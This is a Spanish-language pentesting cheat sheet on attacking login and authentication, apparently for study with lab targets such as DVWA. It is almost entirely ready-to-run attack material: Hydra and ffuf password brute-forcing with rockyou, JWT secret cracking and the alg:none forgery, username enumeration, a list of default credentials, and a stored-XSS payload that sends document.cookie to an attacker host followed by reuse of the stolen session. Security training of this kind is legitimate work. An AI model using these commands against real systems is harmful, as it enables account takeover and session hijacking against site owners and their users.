# Ataques a Mecanismos de Autenticacion

OWASP: A07:2021 Identification and Authentication Failures

## Brute Force de login

```bash
# Hydra -- HTTP POST login
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form     "http://objetivo.com/login:username=^USER^&password=^PASS^:Invalid credentials"     -t 30

# ffuf -- mas flexible
ffuf -u http://objetivo.com/login -X POST     -d "username=admin&password=FUZZ"     -w /usr/share/wordlists/rockyou.txt     -fc 200 -mc 302

# En DVWA
ffuf -u http://localhost:8080/vulnerabilities/brute/     -b "PHPSESSID=TU_COOKIE; security=low"     -d "username=admin&password=FUZZ&Login=Login"     -w /usr/share/wordlists/rockyou.txt     -fs TAMANYO_RESPUESTA_FALLIDA
```

## Ataques a JWT (JSON Web Tokens)

```bash
# Decodificar un JWT (sin verificar firma)
echo "HEADER.PAYLOAD.SIGNATURE" | cut -d'.' -f2 | base64 -d 2>/dev/null

# Herramienta: jwt_tool
pip install jwt_tool
jwt_tool TOKEN --crack -d /usr/share/wordlists/rockyou.txt

# Ataque alg:none (si el servidor no verifica el algoritmo)
# Cambiar "alg":"HS256" por "alg":"none" y eliminar la firma
# jwt.io para manipular tokens manualmente

# Fuerza bruta de secreto debil
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
```

## Enumeracion de usuarios

```bash
# Si el mensaje de error es diferente segun el usuario:
# "Usuario incorrecto" vs "Contrasena incorrecta"
# -> podemos enumerar usuarios validos

# Burp Suite Intruder -> probar lista de usuarios
# Comparar longitud/tiempo de respuesta

# ffuf -- detectar usuarios validos por respuesta diferente
ffuf -u http://objetivo.com/login -X POST     -d "username=FUZZ&password=wrongpass"     -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt     -fr "usuario no existe"  # filtrar las respuestas que digan esto
```

## Default Credentials

```bash
# Probar siempre primero:
admin:admin
admin:password
admin:123456
admin:admin123
root:root
test:test
guest:guest

# Buscar credenciales por defecto del producto:
# https://www.defaultpassword.com/
# https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
```

## Session Fixation y Cookie Hijacking

```bash
# Robar cookie con XSS almacenado
<script>fetch('http://ATACANTE:8000/?c='+document.cookie)</script>

# Usar la cookie robada
# Firefox: DevTools -> Storage -> Cookies -> cambiar valor
# curl: curl -b "PHPSESSID=COOKIE_ROBADA" http://objetivo.com/admin
```
